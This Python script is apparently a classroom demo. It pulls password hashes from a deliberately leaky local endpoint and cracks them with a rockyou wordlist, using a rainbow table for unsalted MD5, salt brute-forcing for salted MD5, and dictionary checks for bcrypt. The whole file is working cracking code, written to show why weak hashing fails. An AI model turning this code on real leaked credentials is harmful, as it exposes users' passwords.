import bcrypt
import hashlib
import json
import os
import requests
import time
from create_rainbow_table import create_rainbow_table


target_url = "http://localhost:5000/users.js"
print("\nChoose a hashing algorithm to demonstrate password extraction:\n1: MD5 (unsalted)\n2: MD5 (salted)\n3: bcrypt")
option = input("Enter option: ")
if option == '1':
    hash_type = "pwd_hash_md5_unsalted"
    hash_type_str = "MD5 (unsalted)"
elif option == '2':
    hash_type = "pwd_hash_md5_salted"
    hash_type_str = "MD5 (salted)"
else:
    option = '3'
    hash_type = "pwd_hash_bcrypt"
    hash_type_str = "bcrypt"

# format leaked data from response to a password hash list
# code adapted from: https://stackoverflow.com/questions/22367473/extract-javascript-information-from-url-with-python
exposedUserData_raw = requests.get(target_url + f"?pwd_choice={hash_type}")
exposedUserData_raw_str = exposedUserData_raw.text  # get text from response

# extract the list as a string so it can be jason-parsed
exposedUserData_str = exposedUserData_raw_str[exposedUserData_raw_str.find("["):exposedUserData_raw_str.find("]")+1]
exposedUserData = json.loads(exposedUserData_str)   # parse json & return a dict

exposed_hashes_set = {user["password"] if option != '3' else user["password"].encode() for user in exposedUserData}
print(f"\nHashing algorithm: {hash_type_str}")
print("\nExposed hashes:")
for hash_ in exposed_hashes_set:
    print(f"\t{hash_}" if option == '3' else f"\t'{hash_}'")
total_exposed_hashes = len(exposed_hashes_set)  # for time estimates (bcrypt)
exposed_hashes_cracked = total_exposed_hashes   # for tracking

# read passwords from rockyou.txt & store them in rockyou_pwds
rockyou_filepath = "rocku_1st1k.txt"    # use "rockyou.txt" for full list
with open(rockyou_filepath, "r", errors="ignore") as pwd_file:
    rockyou_pwds_raw = pwd_file.readlines()

print("\nProcessing hashes. Please be patient...\n")

# remove trailing newline character & encode every rockyou password to set it up for hashing
rockyou_pwds = []
for raw_pwd in rockyou_pwds_raw:
    pwd_clean = raw_pwd.rstrip()  # remove trailing newline character
    pwd_to_bytes = pwd_clean.encode('utf-8')  # convert password to array of bytes
    rockyou_pwds.append(pwd_to_bytes)
total_passwords = len(rockyou_pwds)     # to use for time estimates

if option == '1':   # rainbow attack on md5 unsalted hashes
    # create rainbow table if it doesn't exist
    rainbow_table_filepath = "rainbow_table.json"
    if not os.path.exists(rainbow_table_filepath):
        create_rainbow_table(rainbow_table_filepath, rockyou_filepath)

    print("\nTable attack starting...")
    # read pre-computed rainbow table from file to dict
    with open(rainbow_table_filepath, "r") as rainbow_file:
        md5_rainbow_table = json.load(rainbow_file)

    # look up exposed hashes in 'hash table': this simulates the table attack itself
    for exposed_hash in exposed_hashes_set:
        if exposed_hash in md5_rainbow_table:
            print(f"\tSuccess! Matching hash found: '{exposed_hash}', "
                  f"Password: '{md5_rainbow_table[exposed_hash]}'")
            exposed_hashes_cracked -= 1

elif option == '2':     # brute-force on md5 salted hashes
    total_combinations_1byte = 256    # 2^8 possible combinations
    iterations_const = 10000000
    total_comparisons = total_passwords * total_combinations_1byte
    pwd_count = 0
    start_lap = time.time()

    # generate a salt from all possible combinations in 1 byte
    for salt_int in range(total_combinations_1byte):
        salt = salt_int.to_bytes(1, "big")    # convert to byte
        print(f"Trying salt: {salt}")     # show encoded to trace progress

        # create hash from each salt + every rockyou password & compare
        for pwd in rockyou_pwds:
            pwd_count += 1

            if pwd_count % iterations_const == 0:
                # show estimated completion time based on rolling avg
                current_time = time.time()
                elapsed_time = current_time - start_lap
                start_lap = current_time   # update for next iteration

                current_rate = iterations_const / elapsed_time
                remaining_pwds = total_comparisons - pwd_count
                time_estimate_mins = remaining_pwds / (current_rate * 60)
                print(f"Passwords tried: {pwd_count}. Estimated time left (mins): {time_estimate_mins:.2f}")

            hash_md5_salted = hashlib.md5(salt + pwd).hexdigest()  # generate hash
            if hash_md5_salted in exposed_hashes_set:
                print(f"\tSuccess! Hash cracked: '{hash_md5_salted}', Salt: {salt}, Password: '{pwd.decode('utf-8')}'")
                exposed_hashes_cracked -= 1
                if exposed_hashes_cracked == 0:
                    break

        if exposed_hashes_cracked == 0:
            break

else:   # brute-force on bcrypt hashes
    iterations_const = 50   # constant to check time rate against

    # iterate over each exposed hash
    for exposed_hash in exposed_hashes_set:
        print(f"Trying exposed hash: {exposed_hash}")  # show current hash
        total_exposed_hashes -= 1

        # compare each rockyou password against exposed hash
        pwd_count = 0
        start_lap = time.time()

        for pwd in rockyou_pwds:
            pwd_count += 1

            if pwd_count % iterations_const == 0:
                # show estimated completion time based on rolling avg
                current_time = time.time()
                elapsed_time = current_time - start_lap
                start_lap = current_time   # update for next iteration

                current_rate = iterations_const / elapsed_time
                remaining_pwds = total_passwords - pwd_count
                time_estimate_hrs = remaining_pwds / (current_rate * 3600)
                print(f"Passwords tried: {pwd_count}. "
                      f"Estimated remaining time for this hash: {time_estimate_hrs:.2f} hours. ", end='')
                print(f"Exposed hashes left: {total_exposed_hashes}"
                      if total_exposed_hashes > 0 else "Trying last exposed hash.")

            if bcrypt.checkpw(pwd, exposed_hash):   # check match
                salt = exposed_hash[:29]    # salt is first 29 characters in hash
                print(f"\tSuccess! Hash cracked: {exposed_hash}, Salt: {salt}, Password: '{pwd.decode('utf-8')}'")
                exposed_hashes_cracked -= 1
                break

if exposed_hashes_cracked == 0:
    print("\nAll hashes were succesfully cracked.")
else:
    print(f"\nUnable to crack {exposed_hashes_cracked} {'hashes' if exposed_hashes_cracked > 1 else 'hash'}.")
